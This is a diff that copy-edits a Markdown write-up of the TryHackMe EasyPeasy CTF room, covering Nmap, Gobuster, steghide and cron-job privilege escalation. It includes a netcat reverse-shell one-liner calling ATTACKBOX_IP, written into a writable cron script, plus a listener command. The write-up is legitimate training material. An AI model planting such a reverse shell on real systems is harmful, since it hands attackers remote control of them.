@@ -1,54 +1,54 @@
 # [EasyPeasy Room](https://tryhackme.com/room/easypeasyctf)
 ![EasyPeasy Room Image](/resources/easypeasy/EasyPeasy.png)
 ## Introduction
-The EasyPeasy Room is an "easy" rated CTF room on TryHack that aims to give beginners in Cybersecurity a way to apply the tools that they've learned i.e. nmap, Gobuster. in a more practical scenario. In this document, I will explain the steps I take as I go through this room. I have started this room on July 2nd of 2023 and I will continue to detail my steps as I go further through the room.
+The EasyPeasy Room is an "easy" rated CTF room on TryHackMe that aims to give beginners in Cybersecurity a way to apply the tools that they've learned i.e. nmap, Gobuster. in a more practical scenario. In this document, I will explain the steps I take as I go through this room. I started this room on July 2nd of 2023 and I will continue to detail my steps as I go further through the room.
 
 ## Write-Up
 This section details the steps I've taken to complete this CTF.
 
 ### Task 1: Enumeration through Nmap
 #### Step 1: Nmap Scan
-To start off, I decided to go with an nmap scan to enumerate the deployed machine. I ran this command on the AttackBox:   
+To start off, I decided to go with an Nmap scan to enumerate the deployed machine. I ran this command on the AttackBox:   
 `nmap -vv -T5 -A -p- MACHINE_IP`  
 The results of the scan are below.  
 ![EasyPeasy Nmap Scan Results](/resources/easypeasy/EasyPeasyNmapScan.png)
 #### Nmap Command Breakdown
-If you're not interested in my breakdown of what the flags/switches/options on the nmap command do, you can skip by clicking [here](https://github.com/RawBoeuf/thm-ctf-writeups/edit/main/EasyPeasy.md#results-analysisanswering-the-task-questions).
+If you're not interested in my breakdown of what the flags/switches/options on the Nmap command do, you can skip by clicking [here](https://github.com/RawBoeuf/thm-ctf-writeups/edit/main/EasyPeasy.md#results-analysisanswering-the-task-questions).
 
 First on the board is the `-vv` switch. (I will be using "switch" from now on to not confuse it with the CTF's flags/objectives.)  
-This switch enables verbosity level 2. Another similar switch is `-v` this switch increases the verbosity by one level. Verbosity level 2 just means that nmap will provide you with more output. It's especially nice when you can see nmap report the ports as it discovers them although if you want more detailed information such as OS detection, you have to wait for the scan to finish. I just use this in every nmap scan because it's a good habit to have. It is also what is recommended in TryHackMe's introduction room to nmap.  
+This switch enables verbosity level 2. Another similar switch is `-v` this switch increases the verbosity by one level. Verbosity level 2 just means that Nmap will provide you with more output. It's especially nice when you can see Nmap report the ports as it discovers them although if you want more detailed information such as OS detection, you have to wait for the scan to finish. I just use this in every Nmap scan because it's a good habit to have. It is also what is recommended in TryHackMe's introduction room to Nmap.  
 
-Next, we have the `-T5` switch. This switch determines the timing of the nmap scan or how fast the connection is. Currently, we are targeting a very insecure machine so there's no need to worry about IPS or IDS so I just went with T5 for the fastest results. But, in general, the [manual page](https://linux.die.net/man/1/nmap) of nmap recommends you use -T4 on your nmap scans as T5 is a very aggressive setting.
+Next, we have the `-T5` switch. This switch determines the timing of the Nmap scan or how fast the connection is. Currently, we are targeting a very insecure machine so there's no need to worry about IPS or IDS so I just went with T5 for the fastest results. But, in general, the [manual page](https://linux.die.net/man/1/nmap) of Nmap recommends you use -T4 on your Nmap scans as T5 is a very aggressive setting.
 
-Moving to the `-A` switch. This switch enables aggressive scan options. According to the nmap man page, this option enables OS detection `-O`, version scanning `-sV`, script scanning `-sC`, and traceroute `--traceroute`. For the purposes of Task 1, we only really need the `-sV` switch, but the `-A` switch provides some extra information that we will be using in Task 2.
+Moving to the `-A` switch. This switch enables aggressive scan options. According to the Nmap man page, this option enables OS detection `-O`, version scanning `-sV`, script scanning `-sC`, and traceroute `--traceroute`. For the purposes of Task 1, we only really need the `-sV` switch, but the `-A` switch provides some extra information that we will be using in Task 2.
 
-Lastly, we have the `-p-` switch. This switch determines which ports nmap will scan on the target machine. The original switch is `-p` where you can pass parameters to instruct nmap on which ports to scan. For a more detailed breakdown of it, you can have a look at the manual page. My addition of a dash to the switch just means that nmap will scan through the full port range, so ports 1-65535.
+Lastly, we have the `-p-` switch. This switch determines which ports Nmap will scan on the target machine. The original switch is `-p` where you can pass parameters to instruct Nmap on which ports to scan. For a more detailed breakdown of it, you can have a look at the manual page. My addition of a dash to the switch just means that Nmap will scan through the full port range, so ports 1-65535.
 
-Now that we have an understanding of what the nmap scan is doing, we can move onto analyzing the results and answering the questions.
+Now that we have an understanding of what the Nmap scan is doing, we can move on to analyzing the results and answering the questions.
 
 #### Results Analysis/Answering The Task Questions
 **Question 1: How many ports are open?**  
 
-If we take a look at the nmap scan results [above](/writeups/EasyPeasy.md#step-1-nmap-scan).   
+If we take a look at the Nmap scan results [above](/writeups/EasyPeasy.md#step-1-nmap-scan).   
 We can find that ports 80, 6498, and 65524 are open. Thus, the answer to this question is 3.  
 **Answer: 3**   
 
-**Question 2: What is the version of nginx?**  
-For your convenience, I have put the relevant section of the nmap scan below.  
+**Question 2: What is the version of Nginx?**  
+For your convenience, I have put the relevant section of the Nmap scan below.  
  ![EasyPeasy Nmap Scan Results Apache](/resources/easypeasy/EasyPeasyNmapNginx.png)  
 We can see that port 80 is open on the target and that it is hosting nginx version 1.16.1. Therefore, the version of nginx is 1.16.1.  
 **Answer: 1.16.1**
 
 **Question 3: What is running on the highest port?**  
-The highest port discovered from the nmap scan is 65524, so let's take a look at what nmap found.  
+The highest port discovered from the Nmap scan is 65524, so let's take a look at what Nmap found.  
 ![EasyPeasy Nmap Scan Results Apache](/resources/easypeasy/EasyPeasyNmapApache.png)  
-Looks like nmap found port 65524 to be hosting an apache http server instance. Therefore, we have our answer.  
+Looks like Nmap found port 65524 to be hosting an Apache HTTP server instance. Therefore, we have our answer.  
 **Answer: apache**   
 
 ### Task 2: Compromising the machine  
 **Note:** I'm showing you my own thought process so the order that I discovered the flags is not in the order of the tasks. I will still mention which flags correspond to which answer. Thanks for reading!
 #### Step 1: Cursory Investigation
-Before we do anything else, we can do some basic info-gathering. We see that the machine has two http services open on ports 80 and 65524. The nmap scan even notes that both ports have a robots.txt file.
+Before we do anything else, we can do some basic info-gathering. We see that the machine has two HTTP services open on ports 80 and 65524. The Nmap scan even notes that both ports have a robots.txt file.
 
 First, let's take a look at the robots.txt file on both ports.  
 
@@ -117,9 +117,9 @@ Now that we can't find anything through a cursory glance, let's try to find some
 
 The command I'll be running is `gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`.  
 
-`dir` sets gobuster into directory enumeration mode. `-u` sets the url that we will be enumerating. Finally, `-w` sets the wordlist that we will be using for directory enumeration. In this case, I'll be using a preset wordlist that comes with the AttackBox "directory-list-2.3-medium.txt". For more detailed information, visit the gobuster [man page](https://www.kali.org/tools/gobuster/).  
+`dir` sets Gobuster into directory enumeration mode. `-u` sets the url that we will be enumerating. Finally, `-w` sets the wordlist that we will be using for directory enumeration. In this case, I'll be using a preset wordlist that comes with the AttackBox "directory-list-2.3-medium.txt". For more detailed information, visit the gobuster [man page](https://www.kali.org/tools/gobuster/).  
 
-Let's take a look at the results of gobuster below.  
+Let's take a look at the results of Gobuster below.  
 
 ![Gobuster Results](/resources/easypeasy/GobusterNginxResults1.png)  
 
@@ -131,7 +131,7 @@ At first glance, there doesn't really seem to be anything going on. So, we'll ha
 
 ![Hidden HTML](/resources/easypeasy/EasyPeasyHiddenHTML.png)
 
-Hm. It looks like there's nothing here either. Let's have another go at this with gobuster. The command I'll be running is `gobuster dir -u http://MACHINE_IP/hidden/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`  
+Hm. It looks like there's nothing here either. Let's have another go at this with Gobuster. The command I'll be running is `gobuster dir -u http://MACHINE_IP/hidden/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`  
 
 ![Gobuster Results 2](/resources/easypeasy/GobusterNginxResults2.png)  
 
@@ -175,7 +175,7 @@ what is the password?**
 
 #### Step 3: Steganography
 
-Some gobuster enumeration revealed no results, so I determined there was probably something fishy to do with the image. So I downloaded it onto my attackbox and ran steghide extraction on it. `steghide extract -sf index.png`  
+Some Gobuster enumeration revealed no results, so I determined there was probably something fishy to do with the image. So I downloaded it onto my attackbox and ran steghide extraction on it. `steghide extract -sf index.png`  
 `extract` specifies that we want to extract hidden information from the file. `-sf` specifies the file that we want to extract the information from. More information can be found on the steghide [man page](https://steghide.sourceforge.net/documentation/manpage.php).  
 
 It requires a passphrase, well we still haven't used the password from the previous question so let's try it.
@@ -229,11 +229,11 @@ anacrontab and crontab are files while the others are directories. I used cat on
 
 ![crontab](/resources/easypeasy/crontab.png)  
 
-It looks like there's a bash file in `/var/www/` that gets run periodically specifically every minute. This looks like the cronjob vulnerability that we were looking for. I run nano on it using `nano /var/www/.mysecretcronjob.sh` since vim isn't installed on the machine and find that it is indeed writable. Eureka.  
+It looks like there's a bash file in `/var/www/` that gets run periodically specifically every minute. This looks like the cronjob vulnerability that we were looking for. I run nano on it using `nano /var/www/.mysecretcronjob.sh` since Vim isn't installed on the machine and find that it is indeed writable. Eureka.  
 
-Now for some exploiting. We'll be setting up a Reverse Shell using netcat. To do that, we'll need to add this line `rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKBOX_IP 4444 >/tmp/f` to the `.mysecretcronjob.sh` file. Along with running the command `netcat -lvnp 4444` on our own machine, we'll have our reverse shell up and running the next time this cronjob is run. For more detailed breakdown of the commands click [here](/writeups/EasyPeasy.md#cronjob-detailed-breakdown).  
+Now for some exploiting. We'll be setting up a Reverse Shell using Netcat. To do that, we'll need to add this line `rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKBOX_IP 4444 >/tmp/f` to the `.mysecretcronjob.sh` file. Along with running the command `netcat -lvnp 4444` on our own machine, we'll have our reverse shell up and running the next time this cronjob is run. For more detailed breakdown of the commands click [here](/writeups/EasyPeasy.md#cronjob-detailed-breakdown).  
 
-After a bit of waiting, this is what I received on my netcat listener. I ran whoami to make sure it was working properly.  
+After a bit of waiting, this is what I received on my Netcat listener. I ran whoami to make sure it was working properly.  
 
 ![Reverse Shell Success](/resources/easypeasy/netcatlisten.png)  
 
